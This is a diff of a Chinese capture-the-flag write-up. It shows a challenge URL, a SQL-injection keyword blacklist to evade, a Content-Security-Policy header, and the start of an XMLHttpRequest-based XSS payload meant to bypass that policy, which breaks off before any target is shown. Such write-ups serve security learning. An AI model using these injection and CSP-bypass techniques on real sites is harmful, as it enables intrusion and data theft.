@@ -64,9 +64,11 @@ if __name__ == '__main__':
 
 http://183.129.189.60:10112/?by=desc
 
+
+
 黑名单:`',",!,#,$,&,+,;,<,=,>,?,@,\,|,if,exp,info,ascii,ord,sys,count,order,by,author,where`
 
-给了个hint:`table`,不知道啥意思
+给了个`hint table`,不知道啥意思
 
 ```python
 
@@ -171,6 +173,8 @@ function checkNote($s) {
 csp:`Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src 'self'; object-src 'none'; require-trusted-types-for 'script';`
 
 绕过
+
+xmlhttp
 
 ```javascript
 <script >xmlhttp=new XMLHttpRequest();
